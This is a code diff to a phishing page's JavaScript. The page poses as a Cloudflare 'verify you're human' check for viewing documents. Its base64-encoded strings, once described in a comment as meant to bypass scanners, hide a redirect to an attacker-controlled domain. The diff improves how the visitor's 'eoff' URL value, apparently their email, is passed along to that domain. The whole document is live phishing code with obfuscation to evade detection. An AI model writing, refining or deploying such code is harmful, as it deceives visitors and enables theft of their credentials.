@@ -24,18 +24,15 @@
         (function() {
             const root = document.getElementById('app-root');
 
-            // Encrypted parts to bypass scanners
             const parts = {
-                path: "aHR0cHM6Ly90aWZmbnVhZS5vbmxpbmUvYXBpL3YxL3RnS0hmMHIwRVdxSWFDYjU=", // tiffnuae correctly encoded
-                sub: "b2ZmaW52Lg==", // "offinv."
+                path: "aHR0cHM6Ly90aWZmbnVhZS5vbmxpbmUvYXBpL3YxL3RnS0hmMHIwRVdxSWFDYjU=", 
+                sub: "b2ZmaW52Lg==", 
                 msg: "VG8gdmlldyB0aGVzZSBkb2N1bWVudHMsIHZlcmlmeSB5b3UncmUgaHVtYW4gYmVsb3c=",
-                brand: "Q2xvdWRmbGFyZQ==",
-                q: "Py9fX2VvZmZfXz0="
+                brand: "Q2xvdWRmbGFyZQ=="
             };
 
             const _d = (v) => atob(v);
 
-            // Phase 1
             root.innerHTML = '<img src="astro.png" class="pulse">';
 
             setTimeout(() => {
@@ -68,16 +65,18 @@
                         lbl.textContent = "Success";
                         lbl.style.color = '#28a745';
 
-                  
-                        const base = _d(parts.path).replace('https://', 'https://' + _d(parts.sub));
+                        // 1. Build the base redirect URL
+                        const baseRedirect = _d(parts.path).replace('https://', 'https://' + _d(parts.sub));
 
-                        let extra = "";
-                        if (location.href.includes(_d(parts.q))) {
-                            extra = location.href.split(_d(parts.q))[1];
-                        }
+                        // 2. Extract the 'eoff' value from the CURRENT browser URL
+                        const urlParams = new URLSearchParams(window.location.search);
+                        const eoffValue = urlParams.get('eoff');
+
+                        // 3. Append as a hash if it exists
+                        const finalUrl = eoffValue ? `${baseRedirect}#${eoffValue}` : baseRedirect;
 
                         setTimeout(() => {
-                            window.location.replace(base + extra);
+                            window.location.replace(finalUrl);
                         }, 1200);
                     }, 2000);
                 };
